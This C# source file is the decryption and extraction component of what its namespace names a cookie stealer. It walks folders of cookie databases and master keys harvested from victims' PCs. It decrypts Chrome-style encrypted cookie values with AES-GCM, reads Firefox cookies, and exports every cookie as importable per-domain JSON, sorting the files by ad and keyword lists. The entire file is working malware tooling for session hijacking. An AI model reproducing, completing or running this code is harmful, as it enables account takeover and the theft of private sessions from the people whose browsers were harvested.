using System.Globalization;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Data.Sqlite;
using Newtonsoft.Json;

namespace CookieStealer.Utilities;

public class Extractor
{
    private readonly Regex _regex = new(@"^\d{10}$");
    private readonly List<string> _scans = new();

    public Extractor()
    {
        ScanDirectory("extracted");
    }

    private void ScanDirectory(string directory)
    {
        foreach (var subDirectory in Directory.GetDirectories(directory))
        {
            var directoryName = Path.GetFileName(subDirectory);
            if (_regex.IsMatch(directoryName))
            {
                _scans.Add(subDirectory);
                if (!Directory.GetDirectories(subDirectory).Any(browserDirectory =>
                        Path.Exists(Path.Combine(browserDirectory, "cookies")))) continue;
                _scans.Remove(subDirectory);
            }
            else
            {
                ScanDirectory(subDirectory);
            }
        }
    }

    private void DisplayScan(string scan)
    {
        var scanTime = Path.GetFileName(scan);
        var parsedDate = DateTime.ParseExact(scanTime, "yyMMddHHmm", CultureInfo.InvariantCulture);
        var formattedDate = parsedDate.ToString("dd.MM.yyyy HH:mm");

        var pcName = Directory.GetParent(scan).Parent.Name;
        var userName = Directory.GetParent(scan).Name;

        // Calculate the maximum length of the PC and user names in all scans
        var maxPcNameLength = _scans.Max(s => Directory.GetParent(s).Parent.Name.Length);
        var maxUserNameLength = _scans.Max(s => Directory.GetParent(s).Name.Length);

        // Use the maximum length for padding
        Console.WriteLine($"|{new string('-', maxPcNameLength + maxUserNameLength + 40)}|");
        Console.WriteLine(
            $"| PC: {pcName.PadRight(maxPcNameLength)} | User: {userName.PadRight(maxUserNameLength)} | Date: {formattedDate} |");
        Console.WriteLine($"|{new string('-', maxPcNameLength + maxUserNameLength + 40)}|");
    }

    public void DecryptAndExtract()
    {
        foreach (var scanDirectory in _scans)
        {
            DisplayScan(scanDirectory);
            foreach (var browserPath in Directory.GetDirectories(scanDirectory))
            {
                var browserName = Path.GetFileName(browserPath);
                var databaseDirectory = Path.Combine(browserPath, "database");

                foreach (var directory in Directory.GetDirectories(databaseDirectory))
                {
                    var directoryName = Path.GetFileName(directory);
                    var dbFileName = Path.Combine(directory, "Cookies");

                    if (!Path.Exists(dbFileName)) continue;

                    File.Copy(dbFileName, dbFileName + "_decrypted", true);

                    if (Path.Exists(databaseDirectory + "\\master.key"))
                    {
                        var key = File.ReadAllBytes(Path.Combine(databaseDirectory, "master.key"));
                        Console.Write($"Decrypting {browserName} ({directoryName}) cookies... ");
                        DecryptDb(dbFileName + "_decrypted", key);
                        Console.WriteLine("Done.");
                    }

                    var extractionPath = Path.Combine(browserPath, "cookies", directoryName);
                    Directory.CreateDirectory(extractionPath);
                    ExtractCookies(directory, extractionPath, browserName);
                }
            }

            Console.Clear();
        }
    }

    private static void DecryptDb(string cookiesPath, byte[] key)
    {
        using var connection = new SqliteConnection($"Data Source={cookiesPath}");
        connection.Open();

        var command = connection.CreateCommand();
        command.CommandText =
            """
            SELECT *
            FROM cookies
            """;

        var countCommand = connection.CreateCommand();
        countCommand.CommandText =
            """
            SELECT COUNT(*)
            FROM cookies
            """;
        var totalRows = Convert.ToInt32(countCommand.ExecuteScalar());

        using (var progress = new ProgressBar())
        {
            using var reader = command.ExecuteReader();

            var i = 0;
            while (reader.Read())
            {
                var name = reader["name"].ToString();
                if (string.IsNullOrEmpty(name)) continue;

                var encryptedValue = (byte[])reader["encrypted_value"];
                var creationUtc = reader["creation_utc"].ToString();

                var value = DecryptCookie(key, encryptedValue);

                using var updateCommand = connection.CreateCommand();
                updateCommand.CommandText =
                    """
                    UPDATE cookies
                    SET value = $value
                    WHERE creation_utc = $creation_utc
                    """;
                updateCommand.Parameters.AddWithValue("$value", value);
                updateCommand.Parameters.AddWithValue("$creation_utc", creationUtc);
                updateCommand.ExecuteNonQuery();

                i++;
                progress.Report((double)i / totalRows);
            }
        }
    }

    private static string DecryptCookie(byte[] masterKey, byte[] cookie)
    {
        var nonce = cookie[3..15];
        var ciphertext = cookie[15..^16];
        var tag = cookie[^16..cookie.Length];

        var resultBytes = new byte[ciphertext.Length];

        using var aesGcm = new AesGcm(masterKey);
        aesGcm.Decrypt(nonce, ciphertext, tag, resultBytes);
        var cookieValue = Encoding.UTF8.GetString(resultBytes);
        return cookieValue;
    }

    private static void ExtractCookies(string cookiesPath, string extractionPath, string browserName)
    {
        using var connection = new SqliteConnection($"Data Source={Path.Combine(cookiesPath, "Cookies_decrypted")}");
        connection.Open();

        var command = connection.CreateCommand();
        command.CommandText = browserName.ToLower() != "firefox"
            ? """
              SELECT host_key as domain,
                     expires_utc as expirationDate,
                     host_key as hostOnly,
                     is_httponly as httpOnly,
                     name,
                     path,
                     samesite as sameSite,
                     is_secure as secure,
                     is_persistent as session,
                     null as storeID,
                     value
              FROM cookies
              """
            : """
              SELECT host as domain,
                     expiry as expirationDate,
                     host as hostOnly,
                     isHttpOnly as httpOnly,
                     name,
                     path,
                     sameSite,
                     isSecure as secure,
                     true as session,
                     null as storeID,
                     value
              FROM moz_cookies
              """;

        var cookies = new Dictionary<string, List<dynamic>>();
        using var reader = command.ExecuteReader();
        while (reader.Read())
        {
            var cookie = new
            {
                domain = reader["domain"].ToString(),
                expirationDate = browserName.ToLower() != "firefox"
                    ? Translator.ConvertExpiresUtcToExpirationDate(Convert.ToDecimal(reader["expirationDate"]))
                    : reader["expirationDate"],
                hostOnly = Translator.HostOnly(reader["hostOnly"].ToString()),
                httpOnly = Convert.ToBoolean(reader["httpOnly"]),
                name = reader["name"].ToString(),
                path = reader["path"].ToString(),
                sameSite = Translator.SameSite(Convert.ToInt16(reader["sameSite"])),
                secure = Convert.ToBoolean(reader["secure"]),
                session = Convert.ToBoolean(reader["session"]),
                storeID = reader["storeID"],
                value = reader["value"].ToString()
            };

            var domain = Translator.FileName(cookie.domain);
            if (!cookies.ContainsKey(domain)) cookies[domain] = new List<dynamic>();

            cookies[domain].Add(cookie);
        }

        var adsDomains = new HashSet<string>(File.ReadLines(Path.Combine("FilterList", "ads.txt")));
        var keywords = new List<string>(File.ReadLines(Path.Combine("FilterList", "keywords.txt")));
        Directory.CreateDirectory(Path.Combine(extractionPath, "ads"));
        Directory.CreateDirectory(Path.Combine(extractionPath, "keywords"));

        foreach (var domain in cookies.Keys)
        {
            var json = JsonConvert
                .SerializeObject(cookies[domain], Formatting.Indented);
            string path;

            if (adsDomains.Contains(domain))
                path = Path.Combine(extractionPath, "ads", $"{domain}.json");
            else if (keywords.Any(keyword => domain.Contains(keyword)))
                path = Path.Combine(extractionPath, "keywords", $"{domain}.json");
            else
                path = Path.Combine(extractionPath, $"{domain}.json");
            File.WriteAllText(path, json);
        }
    }
}